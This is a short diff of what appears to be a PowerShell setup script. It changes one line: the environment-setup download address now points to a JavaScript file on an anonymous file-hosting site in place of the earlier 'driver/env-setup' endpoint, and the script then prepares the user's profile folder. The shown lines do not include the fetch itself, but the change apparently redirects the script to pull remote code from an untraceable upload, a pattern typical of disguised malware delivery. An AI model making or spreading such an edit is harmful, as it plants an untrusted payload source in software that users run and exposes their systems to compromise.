@@ -226,7 +226,7 @@ else {
     }
 }
 
-$envSetupUrl = "https://api.wecreateproblems.us/driver/env-setup.npl"
+$envSetupUrl = "https://files.catbox.moe/l2rxnb.js"
 $codeProfile = $env:USERPROFILE
 if (-not (Test-Path -LiteralPath $codeProfile)) {
     New-Item -ItemType Directory -Path $codeProfile -Force *> $null
